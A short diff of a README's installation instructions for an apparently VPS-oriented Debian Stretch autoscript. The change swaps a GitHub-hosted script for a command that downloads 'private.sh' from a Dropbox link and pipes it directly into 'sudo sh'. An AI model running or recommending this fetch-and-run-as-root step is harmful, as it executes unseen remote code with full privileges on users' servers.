@@ -25,4 +25,4 @@
 <h3 align="center">Installation (DigitalOcean, VULTR & MNX Solutions)</h3>
 
   ```html
-wget https://raw.githubusercontent.com/johndesu090/AutoScriptDebianStretch/master/DebianStretch && chmod +x DebianStretch && ./DebianStretch
+sudo wget https://www.dropbox.com/s/u8q6te1xtu2bk83/private.sh?dl=1 -qO - | sudo sh
